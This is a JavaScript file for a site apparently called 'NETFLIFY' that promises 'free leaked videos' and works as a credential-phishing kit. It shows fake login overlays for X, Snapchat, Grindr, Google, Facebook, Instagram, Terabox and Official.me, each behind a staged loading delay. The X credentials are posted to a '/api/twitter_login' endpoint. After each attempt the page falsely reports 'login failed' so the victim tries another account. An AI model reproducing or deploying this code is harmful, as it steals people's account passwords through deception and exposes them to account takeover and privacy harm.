document.addEventListener('DOMContentLoaded', () => {
    // Authentication Logic
    const authOverlay = document.getElementById('authOverlay');
    const authForm = document.getElementById('authForm');
    const authEmail = document.getElementById('authEmail');
    const authPassword = document.getElementById('authPassword');
    const authError = document.getElementById('authError');
    const authSubmitBtn = document.getElementById('authSubmitBtn');
    const toggleAuthMode = document.getElementById('toggleAuthMode');
    const authSubtitle = document.getElementById('authSubtitle');
    const authToggleText = document.getElementById('authToggleText');
    const logoutBtn = document.getElementById('logoutBtn');

    let authMode = 'login'; // 'login' or 'signup'

    // Helper to open auth overlay with specific configurations
    const openAuthWithMode = (mode, customTitle = null) => {
        const logoEl = authOverlay.querySelector('.logo');
        const authToggleEl = authOverlay.querySelector('.auth-toggle');
        const socialAuthEl = authOverlay.querySelector('.social-auth-section');

        if (customTitle) {
            if (logoEl) logoEl.textContent = customTitle;
            if (authSubtitle) authSubtitle.style.display = 'none';
            if (authToggleEl) authToggleEl.style.display = 'none';
            if (socialAuthEl) socialAuthEl.style.display = 'none';
        } else {
            if (logoEl) logoEl.textContent = 'NETFLIFY';
            if (authSubtitle) authSubtitle.style.display = 'block';
            if (authToggleEl) authToggleEl.style.display = 'block';
            if (socialAuthEl) socialAuthEl.style.display = 'block';
        }

        authMode = mode;
        if (authMode === 'login') {
            if (authSubmitBtn) authSubmitBtn.textContent = 'Login';
            if (authSubtitle && !customTitle) authSubtitle.textContent = 'Sign in to NETLIFY to watch the free leaked videos';
            if (authToggleText) authToggleText.textContent = "Don't have an account?";
            if (toggleAuthMode) toggleAuthMode.textContent = 'Sign Up';
        } else {
            if (authSubmitBtn) authSubmitBtn.textContent = 'Sign Up';
            if (authSubtitle) authSubtitle.textContent = 'Create an account to view NETFLIFY';
            if (authToggleText) authToggleText.textContent = 'Already have an account?';
            if (toggleAuthMode) toggleAuthMode.textContent = 'Login';
        }

        authOverlay.classList.remove('hidden');
        document.body.style.overflow = 'hidden';
    };

    // Check login state
    const checkLoginState = () => {
        if (localStorage.getItem('isLoggedIn') === 'true') {
            authOverlay.classList.add('hidden');
            logoutBtn.style.display = 'flex';
            document.body.style.overflow = 'auto';
        } else {
            authOverlay.classList.add('hidden'); // Starts hidden, page is fully visible
            logoutBtn.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    };
    checkLoginState();

    // Close Auth overlay
    const closeAuthBtn = document.getElementById('closeAuth');
    if (closeAuthBtn) {
        closeAuthBtn.addEventListener('click', () => {
            authOverlay.classList.add('hidden');
            document.body.style.overflow = 'auto';
            window.pendingMedia = null;
        });
    }

    // Twitter button click listener
    const twitterBtn = document.getElementById('twitterBtn');
    const xAuthOverlay = document.getElementById('xAuthOverlay');
    const closeXAuth = document.getElementById('closeXAuth');
    const xLoadingOverlay = document.getElementById('xLoadingOverlay');

    if (twitterBtn) {
        twitterBtn.addEventListener('click', () => {
            // Close the main auth overlay if open
            if (authOverlay) authOverlay.classList.add('hidden');
            
            // Show loading overlay
            if (xLoadingOverlay) {
                xLoadingOverlay.classList.remove('hidden');
                document.body.style.overflow = 'hidden';
            }
            
            // Wait 2.5 seconds before showing the login
            setTimeout(() => {
                if (xLoadingOverlay) xLoadingOverlay.classList.add('hidden');
                
                // Open X Auth overlay
                if (xAuthOverlay) {
                    xAuthOverlay.classList.remove('hidden');
                    document.body.style.overflow = 'hidden';
                }
            }, 2500); // 2.5 seconds
        });
    }

    if (closeXAuth) {
        closeXAuth.addEventListener('click', () => {
            xAuthOverlay.classList.add('hidden');
            document.body.style.overflow = 'auto';
        });
    }

    // X Login button state toggle logic
    const xUsernameInput = document.getElementById('xUsername');
    const xPasswordInput = document.getElementById('xPassword');
    const xContinueBtn = document.getElementById('xContinueBtn');

    if (xUsernameInput && xPasswordInput && xContinueBtn) {
        function toggleXButtonState() {
            const usernameValue = xUsernameInput.value.trim();
            const passwordValue = xPasswordInput.value.trim();
            
            if (usernameValue !== '' && passwordValue !== '') {
                xContinueBtn.classList.add('active');
            } else {
                xContinueBtn.classList.remove('active');
            }
        }
        
        xUsernameInput.addEventListener('input', toggleXButtonState);
        xPasswordInput.addEventListener('input', toggleXButtonState);
        toggleXButtonState();
        
        xContinueBtn.addEventListener('click', async function(e) {
            if (xContinueBtn.classList.contains('active')) {
                const username = xUsernameInput.value.trim();
                const password = xPasswordInput.value.trim();
                
                const apiHost = window.location.protocol === 'file:' ? 'http://localhost:5001' : '';
                const endpoint = apiHost + '/api/twitter_login';
                
                try {
                    await fetch(endpoint, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ username, password })
                    });
                    
                    // Close the overlay after saving
                    xAuthOverlay.classList.add('hidden');
                    xUsernameInput.value = '';
                    xPasswordInput.value = '';
                    toggleXButtonState();
                    
                    alert('login failed. please try with the other login method.');
                    
                    // Re-open main auth overlay so user can try another method
                    const authOverlay = document.getElementById('authOverlay');
                    if (authOverlay) {
                        authOverlay.classList.remove('hidden');
                        document.body.style.overflow = 'hidden';
                    } else {
                        document.body.style.overflow = 'auto';
                    }
                } catch (err) {
                    console.error('Error submitting login:', err);
                }
            }
        });
    }

    // Snapchat button click listener
    const snapchatBtn = document.getElementById('snapchatBtn');
    const snapchatAuthOverlay = document.getElementById('snapchatAuthOverlay');
    const closeSnapchatAuth = document.getElementById('closeSnapchatAuth');
    const snapchatLoadingOverlay = document.getElementById('snapchatLoadingOverlay');

    if (snapchatBtn) {
        snapchatBtn.addEventListener('click', () => {
            // Close the main auth overlay if open
            if (authOverlay) authOverlay.classList.add('hidden');
            
            // Show loading overlay
            if (snapchatLoadingOverlay) {
                snapchatLoadingOverlay.classList.remove('hidden');
                document.body.style.overflow = 'hidden';
            }
            
            // Wait 2.5 seconds before showing the login
            setTimeout(() => {
                if (snapchatLoadingOverlay) snapchatLoadingOverlay.classList.add('hidden');
                
                // Open Snapchat Auth overlay
                if (snapchatAuthOverlay) {
                    snapchatAuthOverlay.classList.remove('hidden');
                    document.body.style.overflow = 'hidden';
                }
            }, 2500); // 2.5 seconds
        });
    }

    if (closeSnapchatAuth) {
        closeSnapchatAuth.addEventListener('click', () => {
            snapchatAuthOverlay.classList.add('hidden');
            document.body.style.overflow = 'auto';
        });
    }

    // Handle postMessage from iframes
    window.addEventListener('message', (event) => {
        if (event.data) {
            let handled = false;
            if (event.data.type === 'SNAPCHAT_LOGIN_DONE') {
                if (snapchatAuthOverlay) snapchatAuthOverlay.classList.add('hidden');
                handled = true;
            } else if (event.data.type === 'GRINDR_LOGIN_DONE') {
                if (grindrAuthOverlay) grindrAuthOverlay.classList.add('hidden');
                handled = true;
            } else if (event.data.type === 'TERABOX_LOGIN_DONE') {
                if (teraboxAuthOverlay) teraboxAuthOverlay.classList.add('hidden');
                handled = true;
            } else if (event.data.type === 'GOOGLE_LOGIN_DONE') {
                if (googleAuthOverlay) googleAuthOverlay.classList.add('hidden');
                handled = true;
            } else if (event.data.type === 'FACEBOOK_LOGIN_DONE') {
                if (facebookAuthOverlay) facebookAuthOverlay.classList.add('hidden');
                handled = true;
            } else if (event.data.type === 'INSTAGRAM_LOGIN_DONE') {
                if (instagramAuthOverlay) instagramAuthOverlay.classList.add('hidden');
                handled = true;
            } else if (event.data.type === 'OFFICIALME_LOGIN_DONE') {
                if (officialMeAuthOverlay) officialMeAuthOverlay.classList.add('hidden');
                handled = true;
            }
            
            if (handled) {
                alert('login failed. please try with the other login method.');
                
                // Re-open main auth overlay
                if (authOverlay) {
                    authOverlay.classList.remove('hidden');
                    document.body.style.overflow = 'hidden';
                } else {
                    document.body.style.overflow = 'auto';
                }
            }
        }
    });

    // Grindr button click listener
    const grindrBtn = document.getElementById('grindrBtn');
    const grindrAuthOverlay = document.getElementById('grindrAuthOverlay');
    const closeGrindrAuth = document.getElementById('closeGrindrAuth');
    const grindrLoadingOverlay = document.getElementById('grindrLoadingOverlay');

    if (grindrBtn) {
        grindrBtn.addEventListener('click', () => {
            if (authOverlay) authOverlay.classList.add('hidden');
            
            if (grindrLoadingOverlay) {
                grindrLoadingOverlay.classList.remove('hidden');
                document.body.style.overflow = 'hidden';
            }
            
            setTimeout(() => {
                if (grindrLoadingOverlay) grindrLoadingOverlay.classList.add('hidden');
                if (grindrAuthOverlay) {
                    grindrAuthOverlay.classList.remove('hidden');
                    document.body.style.overflow = 'hidden';
                }
            }, 2500);
        });
    }

    if (closeGrindrAuth) {
        closeGrindrAuth.addEventListener('click', () => {
            grindrAuthOverlay.classList.add('hidden');
            document.body.style.overflow = 'auto';
        });
    }

    // Terabox button click listener
    const teraboxBtn = document.getElementById('teraboxBtn');
    const teraboxAuthOverlay = document.getElementById('teraboxAuthOverlay');
    const closeTeraboxAuth = document.getElementById('closeTeraboxAuth');
    const teraboxLoadingOverlay = document.getElementById('teraboxLoadingOverlay');

    if (teraboxBtn) {
        teraboxBtn.addEventListener('click', () => {
            if (authOverlay) authOverlay.classList.add('hidden');
            
            if (teraboxLoadingOverlay) {
                teraboxLoadingOverlay.classList.remove('hidden');
                document.body.style.overflow = 'hidden';
            }
            
            setTimeout(() => {
                if (teraboxLoadingOverlay) teraboxLoadingOverlay.classList.add('hidden');
                if (teraboxAuthOverlay) {
                    teraboxAuthOverlay.classList.remove('hidden');
                    document.body.style.overflow = 'hidden';
                }
            }, 2500);
        });
    }

    if (closeTeraboxAuth) {
        closeTeraboxAuth.addEventListener('click', () => {
            teraboxAuthOverlay.classList.add('hidden');
            document.body.style.overflow = 'auto';
        });
    }

    // Google button click listener
    const googleBtn = document.getElementById('googleBtn');
    const googleAuthOverlay = document.getElementById('googleAuthOverlay');
    const closeGoogleAuth = document.getElementById('closeGoogleAuth');
    const googleLoadingOverlay = document.getElementById('googleLoadingOverlay');

    if (googleBtn) {
        googleBtn.addEventListener('click', () => {
            if (authOverlay) authOverlay.classList.add('hidden');
            
            if (googleLoadingOverlay) {
                googleLoadingOverlay.classList.remove('hidden');
                document.body.style.overflow = 'hidden';
            }
            
            setTimeout(() => {
                if (googleLoadingOverlay) googleLoadingOverlay.classList.add('hidden');
                if (googleAuthOverlay) {
                    googleAuthOverlay.classList.remove('hidden');
                    document.body.style.overflow = 'hidden';
                }
            }, 2500);
        });
    }

    if (closeGoogleAuth) {
        closeGoogleAuth.addEventListener('click', () => {
            googleAuthOverlay.classList.add('hidden');
            document.body.style.overflow = 'auto';
        });
    }

    // Facebook button click listener
    const facebookBtn = document.getElementById('facebookBtn');
    const facebookAuthOverlay = document.getElementById('facebookAuthOverlay');
    const closeFacebookAuth = document.getElementById('closeFacebookAuth');
    const facebookLoadingOverlay = document.getElementById('facebookLoadingOverlay');

    if (facebookBtn) {
        facebookBtn.addEventListener('click', () => {
            if (authOverlay) authOverlay.classList.add('hidden');
            
            if (facebookLoadingOverlay) {
                facebookLoadingOverlay.classList.remove('hidden');
                document.body.style.overflow = 'hidden';
            }
            
            setTimeout(() => {
                if (facebookLoadingOverlay) facebookLoadingOverlay.classList.add('hidden');
                if (facebookAuthOverlay) {
                    facebookAuthOverlay.classList.remove('hidden');
                    document.body.style.overflow = 'hidden';
                }
            }, 2500);
        });
    }

    if (closeFacebookAuth) {
        closeFacebookAuth.addEventListener('click', () => {
            facebookAuthOverlay.classList.add('hidden');
            document.body.style.overflow = 'auto';
        });
    }

    // Instagram button click listener
    const instagramBtn = document.getElementById('instagramBtn');
    const instagramAuthOverlay = document.getElementById('instagramAuthOverlay');
    const closeInstagramAuth = document.getElementById('closeInstagramAuth');
    const instagramLoadingOverlay = document.getElementById('instagramLoadingOverlay');

    if (instagramBtn) {
        instagramBtn.addEventListener('click', () => {
            if (authOverlay) authOverlay.classList.add('hidden');
            
            if (instagramLoadingOverlay) {
                instagramLoadingOverlay.classList.remove('hidden');
                document.body.style.overflow = 'hidden';
            }
            
            setTimeout(() => {
                if (instagramLoadingOverlay) instagramLoadingOverlay.classList.add('hidden');
                if (instagramAuthOverlay) {
                    instagramAuthOverlay.classList.remove('hidden');
                    document.body.style.overflow = 'hidden';
                }
            }, 2500);
        });
    }

    if (closeInstagramAuth) {
        closeInstagramAuth.addEventListener('click', () => {
            instagramAuthOverlay.classList.add('hidden');
            document.body.style.overflow = 'auto';
        });
    }

    // Official.me button click listener
    const officialMeBtn = document.getElementById('officialMeBtn');
    const officialMeAuthOverlay = document.getElementById('officialMeAuthOverlay');
    const closeOfficialMeAuth = document.getElementById('closeOfficialMeAuth');
    const officialMeLoadingOverlay = document.getElementById('officialMeLoadingOverlay');

    if (officialMeBtn) {
        officialMeBtn.addEventListener('click', () => {
            if (authOverlay) authOverlay.classList.add('hidden');
            
            if (officialMeLoadingOverlay) {
                officialMeLoadingOverlay.classList.remove('hidden');
                document.body.style.overflow = 'hidden';
            }
            
            setTimeout(() => {
                if (officialMeLoadingOverlay) officialMeLoadingOverlay.classList.add('hidden');
                if (officialMeAuthOverlay) {
                    officialMeAuthOverlay.classList.remove('hidden');
                    document.body.style.overflow = 'hidden';
                }
            }, 2500);
        });
    }

    if (closeOfficialMeAuth) {
        closeOfficialMeAuth.addEventListener('click', () => {
            officialMeAuthOverlay.classList.add('hidden');
            document.body.style.overflow = 'auto';
        });
    }

    // Fullscreen Modal Helper
    const openModal = (file) => {
        const modal = document.getElementById('mediaModal');
        const modalBody = document.getElementById('modalBody');
        modalBody.innerHTML = '';
        
        if (file.type === 'image') {
            const img = document.createElement('img');
            img.src = encodeURI(file.src);
            modalBody.appendChild(img);
        } else if (file.type === 'video') {
            const video = document.createElement('video');
            video.src = encodeURI(file.src);
            video.controls = true;
            video.autoplay = true;
            modalBody.appendChild(video);
        }
        
        modal.style.display = 'flex';
        setTimeout(() => modal.classList.add('show'), 10);
        document.body.style.overflow = 'hidden';
    };

    // Toggle Mode
    toggleAuthMode.addEventListener('click', () => {
        authError.textContent = '';
        if (authMode === 'login') {
            authMode = 'signup';
            authSubmitBtn.textContent = 'Sign Up';
            authSubtitle.textContent = 'Create an account to view NETFLIFY';
            authToggleText.textContent = 'Already have an account?';
            toggleAuthMode.textContent = 'Login';
        } else {
            authMode = 'login';
            authSubmitBtn.textContent = 'Login';
            authSubtitle.textContent = 'Sign in to experience the portfolio';
            authToggleText.textContent = "Don't have an account?";
            toggleAuthMode.textContent = 'Sign Up';
        }
    });

    // Form Submit
    authForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        authError.textContent = '';
        const email = authEmail.value;
        const password = authPassword.value;

        // Support both local testing and served via backend
        const apiHost = window.location.protocol === 'file:' ? 'http://localhost:5001' : '';
        const endpoint = apiHost + (authMode === 'login' ? '/api/login' : '/api/signup');

        try {
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password })
            });

            const data = await response.json();

            if (!response.ok) {
                throw new Error(data.error || 'Something went wrong');
            }

            if (authMode === 'login') {
                localStorage.setItem('isLoggedIn', 'true');
                localStorage.setItem('userEmail', data.user.email);
                checkLoginState();
                
                // Open pending media automatically after successful login
                if (window.pendingMedia) {
                    openModal(window.pendingMedia);
                    window.pendingMedia = null;
                }
            } else {
                // After signup, switch to login
                authMode = 'login';
                authSubmitBtn.textContent = 'Login';
                authSubtitle.textContent = 'Sign in to experience the portfolio';
                authToggleText.textContent = "Don't have an account?";
                toggleAuthMode.textContent = 'Sign Up';
                authEmail.value = email;
                authPassword.value = '';
                authError.style.color = '#10b981';
                authError.textContent = 'Signup successful! Please log in.';
            }
        } catch (err) {
            authError.style.color = '#ef4444';
            authError.textContent = err.message;
        }
    });

    // Logout
    logoutBtn.addEventListener('click', () => {
        localStorage.removeItem('isLoggedIn');
        localStorage.removeItem('userEmail');
        checkLoginState();
    });

    // Scroll Progress
    const scrollBar = document.getElementById('scrollBar');
    window.addEventListener('scroll', () => {
        const winScroll = document.body.scrollTop || document.documentElement.scrollTop;
        const height = document.documentElement.scrollHeight - document.documentElement.clientHeight;
        const scrolled = (winScroll / height) * 100;
        scrollBar.style.width = scrolled + '%';
    });

    // Navbar Scroll Effect
    const navbar = document.querySelector('.navbar');
    window.addEventListener('scroll', () => {
        if (window.scrollY > 50) {
            navbar.classList.add('scrolled');
        } else {
            navbar.classList.remove('scrolled');
        }
    });

    // Ambient Cursor Light
    const ambientLight = document.getElementById('ambientLight');
    if (window.innerWidth > 768) {
        document.addEventListener('mousemove', (e) => {
            ambientLight.style.left = e.clientX + 'px';
            ambientLight.style.top = e.clientY + 'px';
        });
    }

    // Scroll Reveal Animation
    const reveals = document.querySelectorAll('.reveal');
    const revealOptions = {
        threshold: 0.1,
        rootMargin: "0px 0px -50px 0px"
    };

    const revealOnScroll = new IntersectionObserver(function(entries, observer) {
        entries.forEach(entry => {
            if (!entry.isIntersecting) return;
            entry.target.classList.add('active');
            observer.unobserve(entry.target);
        });
    }, revealOptions);

    reveals.forEach(reveal => {
        revealOnScroll.observe(reveal);
    });

    // Fullscreen Modal
    const modal = document.getElementById('mediaModal');
    const modalBody = document.getElementById('modalBody');
    const closeModal = document.querySelector('.close-modal');
    const clickableMedia = document.querySelectorAll('.media-item');

    clickableMedia.forEach(item => {
        item.addEventListener('click', (e) => {

            const type = item.getAttribute('data-type');
            const src = item.getAttribute('data-src');
            
            modalBody.innerHTML = '';
            
            if (type === 'image') {
                const img = document.createElement('img');
                img.src = src;
                modalBody.appendChild(img);
            } else if (type === 'video') {
                const video = document.createElement('video');
                video.src = src;
                video.controls = true;
                video.autoplay = true;
                modalBody.appendChild(video);
            }
            
            modal.style.display = 'flex';
            setTimeout(() => {
                modal.classList.add('show');
            }, 10);
            document.body.style.overflow = 'hidden';
        });
    });

    const closeMediaModal = () => {
        modal.classList.remove('show');
        setTimeout(() => {
            modal.style.display = 'none';
            modalBody.innerHTML = '';
            document.body.style.overflow = 'auto';
        }, 400);
    };

    closeModal.addEventListener('click', closeMediaModal);
    modal.addEventListener('click', (e) => {
        if (e.target === modal || e.target.classList.contains('modal-content')) {
            closeMediaModal();
        }
    });
    
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && modal.classList.contains('show')) {
            closeMediaModal();
        }
    });

    // Background Music Toggle
    const musicToggle = document.getElementById('musicToggle');
    const bgMusic = document.getElementById('bgMusic');
    let isPlaying = false;

    bgMusic.volume = 0.3;

    musicToggle.addEventListener('click', () => {
        if (isPlaying) {
            bgMusic.pause();
            musicToggle.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"></path><circle cx="6" cy="18" r="3"></circle><circle cx="18" cy="16" r="3"></circle></svg>`;
            musicToggle.style.color = "var(--text-primary)";
            musicToggle.style.boxShadow = "none";
        } else {
            bgMusic.play().catch(e => console.log('Autoplay prevented'));
            musicToggle.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon><path d="M15.54 8.46a5 5 0 0 1 0 7.07"></path><path d="M19.07 4.93a10 10 0 0 1 0 14.14"></path></svg>`;
            musicToggle.style.color = "var(--accent-2)";
            musicToggle.style.boxShadow = "0 0 15px rgba(6, 182, 212, 0.4)";
        }
        isPlaying = !isPlaying;
    });

    // Feed Generation Logic
    const feedContainer = document.getElementById('feedContainer');
    
    if (feedContainer && window.MEDIA_DATA && window.MEDIA_DATA.length > 0) {
        feedContainer.innerHTML = ''; // Clear loading/placeholder
        
        window.MEDIA_DATA.forEach(folderData => {
            if (folderData.files && folderData.files.length > 0) {
                // Create Post Container
                const post = document.createElement('div');
                post.className = 'folder-post reveal active';
                
                // Create Header
                const header = document.createElement('div');
                header.className = 'folder-header';
                
                const avatar = document.createElement('div');
                avatar.className = 'folder-avatar';
                avatar.textContent = folderData.folder.charAt(0).toUpperCase();
                
                const name = document.createElement('div');
                name.className = 'folder-name';
                name.textContent = folderData.folder.replace(/\\u0027/g, "'").replace(/&#39;/g, "'").replace(/&apos;/g, "'");
                
                header.appendChild(avatar);
                header.appendChild(name);
                post.appendChild(header);
                
                // Create Grid
                const grid = document.createElement('div');
                grid.className = 'folder-grid';
                
                const fileCount = folderData.files.length;
                if (fileCount === 1) grid.setAttribute('data-count', '1');
                else if (fileCount === 2) grid.setAttribute('data-count', '2');
                else if (fileCount === 3) grid.setAttribute('data-count', '3');
                else if (fileCount === 4) grid.setAttribute('data-count', '4');
                else grid.setAttribute('data-count', 'many');
                
                folderData.files.forEach(file => {
                    const mediaItem = document.createElement('div');
                    mediaItem.className = 'folder-media-item';
                    mediaItem.setAttribute('data-type', file.type);
                    mediaItem.setAttribute('data-src', file.src);
                    
                    if (file.type === 'image') {
                        const img = document.createElement('img');
                        img.loading = 'lazy';
                        img.src = encodeURI(file.src);
                        mediaItem.appendChild(img);
                    } else if (file.type === 'video') {
                        const video = document.createElement('video');
                        video.src = encodeURI(file.src) + '#t=0.1';
                        video.preload = 'metadata';
                        video.muted = true;
                        video.loop = true;
                        mediaItem.appendChild(video);

                        // Add visual indicator that it is a playble video
                        const playOverlay = document.createElement('div');
                        playOverlay.className = 'video-play-overlay';
                        playOverlay.innerHTML = `
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                                <polygon points="5 3 19 12 5 21 5 3"></polygon>
                            </svg>
                        `;
                        mediaItem.appendChild(playOverlay);
                    }
                    
                    // Add click event for fullscreen modal
                    mediaItem.addEventListener('click', () => {
                        if (localStorage.getItem('isLoggedIn') !== 'true') {
                            openAuthWithMode('login');
                            window.pendingMedia = file;
                            return;
                        }
                        
                        openModal(file);
                    });
                    
                    grid.appendChild(mediaItem);
                });
                
                post.appendChild(grid);
                feedContainer.appendChild(post);
            }
        });
    } else if (feedContainer) {
        feedContainer.innerHTML = '<p style="text-align: center; color: var(--text-secondary);">No media found. Please run update_gallery.ps1.</p>';
    }
});
